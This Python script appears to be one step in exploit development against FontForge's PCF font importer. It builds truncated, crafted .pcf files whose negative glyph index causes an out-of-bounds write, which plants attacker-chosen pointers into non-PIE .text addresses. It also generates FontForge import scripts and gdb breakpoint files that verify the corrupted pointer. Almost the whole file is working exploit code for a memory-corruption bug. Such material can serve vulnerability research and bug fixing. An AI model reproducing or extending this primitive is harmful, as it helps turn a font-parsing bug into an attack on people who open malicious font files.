#!/usr/bin/env python3
"""W14: make two file-chosen low-32-bit pointers into the non-PIE .text image.

truncated.pcf is cut after the low byte of the first glyph index, so
getformint16() returns -1 (glyph=-1) again at i=0; the pinned write at
fvimportbdf.c:1751 stores (min2*256 + min1) at encs[glyph]. W10/W11 used
glyph=-50 to reach a live BDFChar.bitmap at encs-200. Here min2/min1 are
chosen so that RHS is a low address inside a non-PIE FontForge's .text:
  0x414243 -> TransDStemHints+554
  0x5a4344 -> AfmSplineFont+1464
The in-bounds probe keeps the pointer at its heap address.
"""
import pathlib
import struct

HERE = pathlib.Path(__file__).resolve().parent
BASE = bytearray((HERE / "truncated.pcf").read_bytes())

CASES = (
    ("value-nonpie-a", 0x4142, 0x0043, 0xCE, 0x414243),
    ("value-nonpie-b", 0x5A43, 0x0044, 0xCE, 0x5A4344),
    ("value-probe", 0x4142, 0x0043, None, 0x0001),
)

for name, min2, min1, low_byte, rhs in CASES:
    data = bytearray(BASE[:0x123])
    struct.pack_into("<HHHH", data, 0x118, min2, min2, min1, min1)
    if low_byte is None:
        data.extend(b"\0")
        struct.pack_into("<H", data, 0x122, rhs)
    else:
        data[0x122] = low_byte
    (HERE / f"{name}.pcf").write_bytes(data)
    (HERE / f"import-{name}-nopie.ff").write_text(
        "New()\n"
        f'Import("{HERE / (name + ".pcf")}")\n'
        f'Save("/tmp/ff2s-w14-{name}.sfd")\n')
    print(f"{name}.pcf rhs={rhs:#010x} glyph={low_byte - 256 if low_byte else 1}")

COND = {
    "value-nonpie-a": "bfc->bitmap == (uint8_t *) 0x414243",
    "value-nonpie-b": "bfc->bitmap == (uint8_t *) 0x5a4344",
}
for name, cond in COND.items():
    (HERE / f"gdb-{name}.cmd").write_text(
        "set pagination off\n"
        f"break sfd.c:1671 if {cond}\n"
        f"run -script import-{name}-nopie.ff\n"
        'printf "HIT enc=%d i=%d bfc=%p bfc->bitmap=%p pt=%p\\n", '
        "enc, i, bfc, bfc->bitmap, pt\n"
        "x/8bx bfc->bitmap\n"
        "bt 3\n"
        "quit\n")

(HERE / "gdb-value-probe-nopie.cmd").write_text(
    "set pagination off\n"
    "break sfd.c:1671\n"
    "run -script import-value-probe-nopie.ff\n"
    'printf "PROBE enc=%d i=%d bfc->bitmap=%p pt=%p\\n", enc, i, bfc->bitmap, pt\n'
    "x/8bx bfc->bitmap\n"
    "quit\n")
(HERE / "gdb-fixed-nopie.cmd").write_text(
    "set pagination off\n"
    "break sfd.c:1671\n"
    "run -script import-value-nonpie-a-nopie.ff\n"
    'printf "FIXED enc=%d i=%d bfc->bitmap=%p\\n", enc, i, bfc->bitmap\n'
    "x/8bx bfc->bitmap\n"
    "quit\n")
